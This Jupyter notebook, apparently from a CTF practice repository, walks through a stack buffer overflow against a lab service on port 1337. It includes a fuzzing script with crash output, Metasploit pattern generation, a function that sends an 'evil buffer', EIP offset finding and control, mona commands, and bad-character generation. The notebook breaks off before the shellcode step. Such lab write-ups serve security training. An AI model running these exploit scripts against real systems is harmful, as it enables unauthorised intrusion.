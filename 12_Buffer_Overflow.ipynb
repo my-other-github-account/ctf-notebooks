{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "41d01cbd-9f82-4925-ba8a-175fa63f1c1f",
   "metadata": {},
   "source": [
    "# Buffer Overflow Basics:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "93e47195-e983-431e-96db-a980442881e4",
   "metadata": {},
   "source": [
    "Crash The Application\n",
    "\n",
    "Find EIP\n",
    "\n",
    "Control ESP\n",
    "\n",
    "Identify Bad Characters\n",
    "\n",
    "Find JMP ESP\n",
    "\n",
    "Generate Shell Code\n",
    "\n",
    "Exploit"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "58afcc77-09ff-40b1-970c-b3ef93aec80e",
   "metadata": {},
   "source": [
    "https://github.com/gh0x0st/Buffer_Overflow"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "669a5c89-3f65-4107-ac64-39d81ce09ab9",
   "metadata": {},
   "source": [
    "# Fuzzing: (Crash App)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "54458e64-34b1-482c-b9ba-8251aabba6fd",
   "metadata": {},
   "source": [
    "ip = \"10.10.8.230\"\n",
    "\n",
    "port = 1337\n",
    "timeout = 5\n",
    "prefix = \"OVERFLOW2 \"Run app in Immunity..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "96ea4a7f-af5e-4b5f-86d5-02e44e46b3ca",
   "metadata": {},
   "outputs": [],
   "source": [
    "ip = \"10.10.71.199\"\n",
    "\n",
    "port = 1337\n",
    "timeout = 5\n",
    "prefix = \"OVERFLOW3 \""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "96f71cee-7458-43b0-b949-2c120a58e2f0",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fuzzing with 100 bytes\n",
      "Fuzzing with 200 bytes\n",
      "Fuzzing with 300 bytes\n",
      "Fuzzing with 400 bytes\n",
      "Fuzzing with 500 bytes\n",
      "Fuzzing with 600 bytes\n",
      "Fuzzing with 700 bytes\n",
      "Fuzzing with 800 bytes\n",
      "Fuzzing with 900 bytes\n",
      "Fuzzing with 1000 bytes\n",
      "Fuzzing with 1100 bytes\n",
      "Fuzzing with 1200 bytes\n",
      "Fuzzing with 1300 bytes\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR:root:Internal Python error in the inspect module.\n",
      "Below is the traceback from this internal error.\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fuzzing crashed at 1300 bytes\n",
      "Traceback (most recent call last):\n",
      "  File \"/tmp/ipykernel_9405/2136669127.py\", line 15, in <module>\n",
      "    s.recv(1024)\n",
      "socket.timeout: timed out\n",
      "\n",
      "During handling of the above exception, another exception occurred:\n",
      "\n",
      "Traceback (most recent call last):\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/interactiveshell.py\", line 3441, in run_code\n",
      "    exec(code_obj, self.user_global_ns, self.user_ns)\n",
      "  File \"/tmp/ipykernel_9405/2136669127.py\", line 18, in <module>\n",
      "    sys.exit(0)\n",
      "SystemExit: 0\n",
      "\n",
      "During handling of the above exception, another exception occurred:\n",
      "\n",
      "Traceback (most recent call last):\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\", line 1101, in get_records\n",
      "    return _fixed_getinnerframes(etb, number_of_lines_of_context, tb_offset)\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\", line 248, in wrapped\n",
      "    return f(*args, **kwargs)\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\", line 281, in _fixed_getinnerframes\n",
      "    records = fix_frame_records_filenames(inspect.getinnerframes(etb, context))\n",
      "  File \"/root/miniconda/lib/python3.9/inspect.py\", line 1541, in getinnerframes\n",
      "    frameinfo = (tb.tb_frame,) + getframeinfo(tb, context)\n",
      "AttributeError: 'tuple' object has no attribute 'tb_frame'\n"
     ]
    },
    {
     "ename": "TypeError",
     "evalue": "object of type 'NoneType' has no len()",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mtimeout\u001b[0m                                   Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_9405/2136669127.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     14\u001b[0m             \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mbytes\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstring\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"latin-1\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 15\u001b[0;31m             \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1024\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     16\u001b[0m     \u001b[0;32mexcept\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mtimeout\u001b[0m: timed out",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mSystemExit\u001b[0m                                Traceback (most recent call last)",
      "    \u001b[0;31m[... skipping hidden 1 frame]\u001b[0m\n",
      "\u001b[0;32m/tmp/ipykernel_9405/2136669127.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     17\u001b[0m         \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Fuzzing crashed at {} bytes\"\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstring\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m-\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprefix\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 18\u001b[0;31m         \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mexit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     19\u001b[0m     \u001b[0mstring\u001b[0m \u001b[0;34m+=\u001b[0m \u001b[0;36m100\u001b[0m \u001b[0;34m*\u001b[0m \u001b[0;34m\"A\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mSystemExit\u001b[0m: 0",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "    \u001b[0;31m[... skipping hidden 1 frame]\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mshowtraceback\u001b[0;34m(self, exc_tuple, filename, tb_offset, exception_only, running_compiled_code)\u001b[0m\n\u001b[1;32m   2052\u001b[0m                     stb = ['An exception has occurred, use %tb to see '\n\u001b[1;32m   2053\u001b[0m                            'the full traceback.\\n']\n\u001b[0;32m-> 2054\u001b[0;31m                     stb.extend(self.InteractiveTB.get_exception_only(etype,\n\u001b[0m\u001b[1;32m   2055\u001b[0m                                                                      value))\n\u001b[1;32m   2056\u001b[0m                 \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mget_exception_only\u001b[0;34m(self, etype, value)\u001b[0m\n\u001b[1;32m    752\u001b[0m         \u001b[0mvalue\u001b[0m \u001b[0;34m:\u001b[0m \u001b[0mexception\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    753\u001b[0m         \"\"\"\n\u001b[0;32m--> 754\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mListTB\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstructured_traceback\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    755\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    756\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mshow_exception_only\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevalue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, evalue, etb, tb_offset, context)\u001b[0m\n\u001b[1;32m    627\u001b[0m             \u001b[0mchained_exceptions_tb_offset\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    628\u001b[0m             out_list = (\n\u001b[0;32m--> 629\u001b[0;31m                 self.structured_traceback(\n\u001b[0m\u001b[1;32m    630\u001b[0m                     \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0metb\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mchained_exc_ids\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    631\u001b[0m                     chained_exceptions_tb_offset, context)\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, value, tb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1365\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1366\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtb\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtb\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1367\u001b[0;31m         return FormattedTB.structured_traceback(\n\u001b[0m\u001b[1;32m   1368\u001b[0m             self, etype, value, tb, tb_offset, number_of_lines_of_context)\n\u001b[1;32m   1369\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, value, tb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1265\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mmode\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mverbose_modes\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1266\u001b[0m             \u001b[0;31m# Verbose modes need a full traceback\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1267\u001b[0;31m             return VerboseTB.structured_traceback(\n\u001b[0m\u001b[1;32m   1268\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtb\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtb_offset\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mnumber_of_lines_of_context\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1269\u001b[0m             )\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, evalue, etb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1122\u001b[0m         \u001b[0;34m\"\"\"Return a nice text document describing the traceback.\"\"\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1123\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1124\u001b[0;31m         formatted_exception = self.format_exception_as_a_whole(etype, evalue, etb, number_of_lines_of_context,\n\u001b[0m\u001b[1;32m   1125\u001b[0m                                                                tb_offset)\n\u001b[1;32m   1126\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mformat_exception_as_a_whole\u001b[0;34m(self, etype, evalue, etb, number_of_lines_of_context, tb_offset)\u001b[0m\n\u001b[1;32m   1080\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1081\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1082\u001b[0;31m         \u001b[0mlast_unique\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecursion_repeat\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfind_recursion\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0morig_etype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1083\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1084\u001b[0m         \u001b[0mframes\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat_records\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mrecords\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mlast_unique\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecursion_repeat\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mfind_recursion\u001b[0;34m(etype, value, records)\u001b[0m\n\u001b[1;32m    380\u001b[0m     \u001b[0;31m# first frame (from in to out) that looks different.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    381\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0mis_recursion_error\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 382\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    383\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    384\u001b[0m     \u001b[0;31m# Select filename, lineno, func_name to track frames with\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mTypeError\u001b[0m: object of type 'NoneType' has no len()"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/env python3\n",
    "\n",
    "import socket, time, sys\n",
    "\n",
    "string = prefix + \"A\" * 100\n",
    "\n",
    "while True:\n",
    "    try:\n",
    "        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "            s.settimeout(timeout)\n",
    "            s.connect((ip, port))\n",
    "            s.recv(1024)\n",
    "            print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))\n",
    "            s.send(bytes(string, \"latin-1\"))\n",
    "            s.recv(1024)\n",
    "    except:\n",
    "        print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))\n",
    "        sys.exit(0)\n",
    "    string += 100 * \"A\"\n",
    "    time.sleep(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "3bbc1fd1-67d7-441e-a4b6-97b863fc4ec6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1300"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "crash_size = len(string) - len(prefix)\n",
    "\n",
    "crash_size"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c8fcf8a3-d0e6-48f3-a015-1710f66e831f",
   "metadata": {},
   "source": [
    "Mona is Windows specific plugin for Immunity Debugger:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e3112090-b309-4e87-b8ce-4d564fbf83c2",
   "metadata": {},
   "outputs": [],
   "source": [
    "!mona config -set workingfolder c:\\mona\\%p"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "edf440c5-8dd0-406c-bd07-a5248feaf837",
   "metadata": {},
   "source": [
    "# Crash Replication, Locating EIP:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6288a135-3c2b-407d-98ea-e64524d745fb",
   "metadata": {},
   "source": [
    "#### Payload: Should be 400 bytes longer than pattern that crashed server\n",
    "\n",
    "(Make sure to insert below)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "40842682-09c2-45dc-8104-33a9b86bc9dc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb\n"
     ]
    }
   ],
   "source": [
    "!locate pattern_create.rb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "d6404f95-d299-4352-8f67-122301b39d6d",
   "metadata": {},
   "outputs": [],
   "source": [
    "crash_size_padded = crash_size + 400\n",
    "# payload_sl = !/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {crash_size_padded}\n",
    "payload_sl = !/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l {crash_size_padded}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "7b2c50bb-6c68-4773-ae2a-ea512bfd603e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce'"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payload = payload_sl.s\n",
    "\n",
    "payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "id": "b7fb867c-47bc-43ba-82fe-150126b5f579",
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "\n",
    "ip = \"10.10.71.199\"\n",
    "port = 1337\n",
    "\n",
    "def run_overflow(payload, prefix=\"OVERFLOW1 \", offset=0, retn=\"\", padding=\"\"):\n",
    "    overflow = \"A\" * offset\n",
    "    postfix = \"\"\n",
    "\n",
    "    buffer = prefix + overflow + retn + padding + payload + postfix\n",
    "\n",
    "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "\n",
    "    try:\n",
    "        s.connect((ip, port))\n",
    "        print(\"Sending evil buffer...\")\n",
    "        s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n",
    "        print(\"Done!\")\n",
    "    except:\n",
    "        print(\"Could not connect.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "48a66899-d478-4e0e-8dcf-4a5495a227db",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "run_overflow(payload, prefix=prefix)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "d13f8d5e-43fb-4d74-84fa-207c21f64ccb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!mona findmsp -distance 1700\n"
     ]
    }
   ],
   "source": [
    "!echo !mona findmsp -distance {crash_size_padded}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "78e9aa24-f91c-40d9-ac9b-31960e662130",
   "metadata": {},
   "source": [
    "### Look for \"EIP Contains Normal Pattern:\" and get offset:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "4999fd54-5b13-490f-9a19-14a0c7795a9e",
   "metadata": {},
   "outputs": [],
   "source": [
    "offset = 1274"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1ae6fdd2-5ad3-48e0-9fa6-67a2c5606da9",
   "metadata": {},
   "source": [
    "# Controlling EIP (next instruction pointer):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "75e4c699-23f1-4499-b651-2a09a224891f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "run_overflow(\"\", offset=offset, retn=\"BBBB\", prefix=prefix) # BBBB is 42424242"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c520975-aa6b-44ec-9bc4-c9804c08be66",
   "metadata": {},
   "source": [
    "Re run in Immunity, verify we can overwrite EIP!\n",
    "\n",
    "EIP should be 42424242\n",
    "\n",
    "Note: ESP is pointer to current stack location, allows us to add data to stack."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c766514f-78df-4e4d-8a45-762b63bebaa9",
   "metadata": {},
   "source": [
    "# Finding Bad Chars:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 221,
   "id": "76b337f4-ee58-49cd-aad4-fe4537295357",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "zsh:1: command not found: mona\n"
     ]
    }
   ],
   "source": [
    "!mona bytearray -b \"\\x00\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "125fa823-8d7e-4aa6-b8c5-a4f5db6d8971",
   "metadata": {},
   "source": [
    "### Generate all possible chars:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "ec7e1b4b-d470-4a44-8ed6-92fe07ccb6ee",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_goodchars(badchars=\"\"):\n",
    "    bytearray_value = \"\"\n",
    "    \n",
    "    human_readable = bytes(badchars, encoding=\"unicode-escape\").decode(\"ascii\")\n",
    "    badints = [int(x, 16) for x in human_readable.split(\"\\\\\\\\x\")[1:]]\n",
    "    print(human_readable, badints)\n",
    "    \n",
    "    for x in range(1, 256):\n",
    "        if x in badints:\n",
    "            continue\n",
    "        else:\n",
    "            bytearray_value += \"\\\\x\" + \"{:02x}\".format(x)\n",
    "    bytearray_bytes =bytes(bytearray_value, encoding='ascii').decode('unicode_escape')\n",
    "    return bytearray_bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "df6fcedc-37ad-4775-99fb-b50f972dc4f5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " []\n",
      "\u0001\u0002\u0003\u0004\u0005\u0006\t\n",
      "\u000e\u000f\u0010\u0011\u0012\u0013\u0014\u0015\u0016\u0017\u0018\u0019\u001a\u001b\u001c",
      "\u001d",
      "\u001e",
      "\u001f !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
